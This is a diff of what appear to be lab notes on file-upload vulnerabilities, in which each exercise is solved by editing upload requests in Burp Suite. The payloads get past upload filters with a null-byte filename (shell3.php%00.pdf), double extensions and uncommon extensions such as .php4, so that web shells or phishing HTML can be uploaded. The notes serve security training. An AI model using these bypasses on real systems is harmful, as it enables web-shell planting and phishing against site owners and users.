@@ -414,13 +414,13 @@ Figure out how much damage can a hacker do using the file upload vulnerability i
 
 *so we need to first upload shell as .jpeg and in burp-suite we can change file-type to .php*
 
-Content-Disposition: form-data; name="image"; filename="hacked.php"
-Content-Type: image/jpeg
+>Content-Disposition: form-data; name="image"; filename="hacked.php"
+>Content-Type: image/jpeg
 
 *but the file-type is cheched even at server side so maybe we can upload .html file*
 
-Content-Disposition: form-data; name="image"; filename="helloworld.html"
-Content-Type: image/jpeg
+>Content-Disposition: form-data; name="image"; filename="helloworld.html"
+>Content-Type: image/jpeg
 
 *.html file is accpeted by server means they are only checking for .php file, hene our html file is uploaded, now we can carry out any client side attack like phising*
 
@@ -437,21 +437,60 @@ See if you can upload a PHP file by exploiting the File Upload vulnerability in 
 ### payload:
 
 for pdf file
-Content-Disposition: form-data; name="dob"; filename="4555v2.pdf"
-Content-Type: application/pdf
+>Content-Disposition: form-data; name="dob"; filename="4555v2.pdf"
+>Content-Type: application/pdf
 
 for non-pdf file
 
-Content-Disposition: form-data; name="residence"; filename="shell.php"
-Content-Type: application/octet-stream
+>Content-Disposition: form-data; name="residence"; filename="shell.php"
+>Content-Type: application/octet-stream
 
 *even after changing the 'Content-Type' to pdf file is checked at server side so we use shell.php%00.pdf -->anything after %00 is disregarded in older version of php and hence the file will be saved as shell.php*
 
 
+for %00 pdf file
+
+>Content-Disposition: form-data; name="nationality"; filename="shell3.php%00.pdf"
+>Content-Type: application/pdf
+
+*here it is accepting this .php%00 file as .pdf*
 
 
 
 
+## Client Side Attack Variant 2
+
+### query:
+Content-Disposition: form-data; name="adhaar"; filename="xyz.pdf"
+Content-Type: application/pdf
+
+### task:
+Figure out how much damage can a hacker do using the file upload vulnerability in the web page below.
+
+### payload:
+*Although it is a blacklist filter php,html,etc are not allowed this is checked at client side as the request is not even sent to burp-suite for blacklisted file type*
+
+*here they are accepting pdf file,we will craft a .html file with .pdf as extension just to bypass the client side filter and at burp-suite we will modify the file name back to original (.html)*
+
+>Content-Disposition: form-data; name="adhaar"; filename="phis.html.pdf"
+>Content-Type: application/pdf
 
 
+
+## Server Side Attack - Case Study
+
+### query:
+Content-Disposition: form-data; name="report"; filename="shell4.php.ppt"
+Content-Type: application/vnd.ms-powerpoint
+
+### task:
+Figure out how much damage can a hacker do using the file upload vulnerability in the web page below.
+
+### payload:
+*Although it is a blacklist filter and a lot of malicious types are not allowed, an attacker can still upload malicious php files with uncommon extensions like php4 php3 etc*
+
+*create a payload with extension .php.ppt and intercept this request with burpsuite and rename extension to .php4 and till will bypass server side filter*
+
+>Content-Disposition: form-data; name="report"; filename="shell4.php4"
+>Content-Type: application/vnd.ms-powerpoint
 
